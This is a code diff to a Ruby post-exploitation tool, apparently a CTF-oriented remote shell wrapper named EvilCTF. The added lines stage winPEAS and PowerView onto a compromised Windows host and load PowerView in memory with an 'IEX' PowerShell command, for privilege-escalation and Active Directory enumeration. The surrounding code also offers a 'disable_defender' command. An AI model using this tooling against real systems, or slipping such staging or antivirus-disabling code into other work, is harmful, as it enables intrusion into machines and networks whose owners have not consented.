@@ -2,7 +2,7 @@
 require_relative 'shell_wrapper'
 require_relative 'banner'
 require_relative 'tools'
-require_relative 'uploader' 
+require_relative 'uploader' # loads EvilCTF::Uploader
 require_relative 'enums'
 require_relative 'sql_enum'
 require 'readline'
@@ -74,10 +74,17 @@ module EvilCTF::Session
     enum_cache = {}
     if session_options[:enum]
       puts "[*] Running enumeration preset: #{session_options[:enum]}"
+      if session_options[:enum] == 'deep'
+        EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
+      end
+      if session_options[:enum] == 'dom'
+        EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
+        shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
+      end
       if session_options[:enum] == 'sql'
         EvilCTF::SQLEnum.run_sql_enum(shell)
       else
-        run_enumeration(shell, type: session_options[:enum], cache: enum_cache,
+        EvilCTF::Enums.run_enumeration(shell, type: session_options[:enum], cache: enum_cache,
                        fresh: session_options[:fresh])
       end
     end
@@ -155,12 +162,25 @@ module EvilCTF::Session
             next
           when /^enum(?:\s+(\S+))?$/i
             t = Regexp.last_match(1) || 'basic'
+            if t == 'deep'
+              EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
+            end
+            if t == 'dom'
+              EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
+              shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
+            end
             if t == 'sql'
               EvilCTF::SQLEnum.run_sql_enum(shell)
             else
-              run_enumeration(shell, type: t, cache: enum_cache,
+              EvilCTF::Enums.run_enumeration(shell, type: t, cache: enum_cache,
                               fresh: session_options[:fresh])
             end
+            next
+          when /^dom_enum$/i
+            EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
+            shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
+            EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache,
+                              fresh: session_options[:fresh])
             next
           when /^disable_defender$/i
             EvilCTF::Tools.disable_defender(shell)
